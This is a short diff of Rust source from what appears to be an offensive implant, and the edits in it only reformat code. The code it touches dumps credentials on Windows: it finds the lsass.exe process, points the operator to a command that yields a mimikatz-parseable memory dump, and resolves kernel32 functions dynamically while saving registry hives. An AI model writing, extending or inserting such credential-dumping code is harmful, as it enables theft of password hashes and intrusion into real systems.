@@ -322,14 +322,11 @@ unsafe fn do_hashdump_vec_lsass(rt: &'static Runtime) -> Vec<Response> {
         crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
         m.push_str(". On the target run: `nyx-kernel dump-lsass ");
         crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
-        m.push_str(
-            "` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n",
-        );
+        m.push_str("` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n");
         m
     };
     vec![Response::Output(msg.into_bytes())]
 }
-
 
 /// Walk the process list via `CreateToolhelp32Snapshot` + `Process32FirstW`/
 /// `Process32NextW` and return the PID of `lsass.exe`, or `None` if not found
@@ -825,14 +822,14 @@ unsafe fn save_hive_fallback_finalize(
     if rc != 0 {
         // Resolve GetTickCount for a unique suffix.
         type GetTickCount = unsafe extern "system" fn() -> u32;
-        let tick: u32 = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetTickCount") }
-        {
-            Some(a) => unsafe { core::mem::transmute::<usize, GetTickCount>(a)() },
-            None => {
-                let _ = close_key(hkey);
-                return Err(rc);
-            }
-        };
+        let tick: u32 =
+            match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetTickCount") } {
+                Some(a) => unsafe { core::mem::transmute::<usize, GetTickCount>(a)() },
+                None => {
+                    let _ = close_key(hkey);
+                    return Err(rc);
+                }
+            };
         let alt_str = save_hive_fallback_alt_path(chunk_name, tick);
         let mut alt_wide: Vec<u16> = Vec::with_capacity(alt_str.len() + 1);
         for c in alt_str.chars() {
